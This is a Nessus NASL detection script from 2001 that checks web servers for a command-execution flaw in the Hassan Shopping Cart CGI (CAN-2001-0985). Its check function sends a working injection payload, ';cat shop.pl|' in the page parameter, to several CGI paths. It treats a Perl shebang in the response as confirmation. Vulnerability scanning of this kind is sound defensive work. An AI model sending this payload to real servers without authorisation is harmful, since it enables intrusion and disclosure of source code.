#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10764); 
script_cve_id("CAN-2001-0985");
 script_bugtraq_id(3308);
 script_version ("$Revision: 1.12 $");

 name["english"] = "Shopping Cart Arbitrary Command Execution (Hassan)";
 script_name(english:name["english"]);

 desc["english"] = "We detected the presence of the Shopping Cart 
CGI (Hassan). A security problem in this CGI allows execution of arbitrary 
commands.

Solution: Contact the author for a patch.

Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/5QP072K5FK.html";

 script_description(english:desc["english"]);

 summary["english"] = "Shopping Cart Arbitrary Command Excution (Hassan)";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "General";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");


function check(prefix)
{
 url = string(prefix, "/shop.pl/page=;cat%20shop.pl|");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);
 if (egrep(pattern:"^#!/.*/perl", string:buf))
    {
     security_hole(port:port);
     exit(0);
    }
}



port = get_kb_item("Services/www");
if (!port) port = 80;
if(!get_port_state(port))exit(0);

check(prefix:"/cgi-local");
check(prefix:"/cgi_bin");

foreach dir (cgi_dirs())
{
 check(prefix:dir);
}
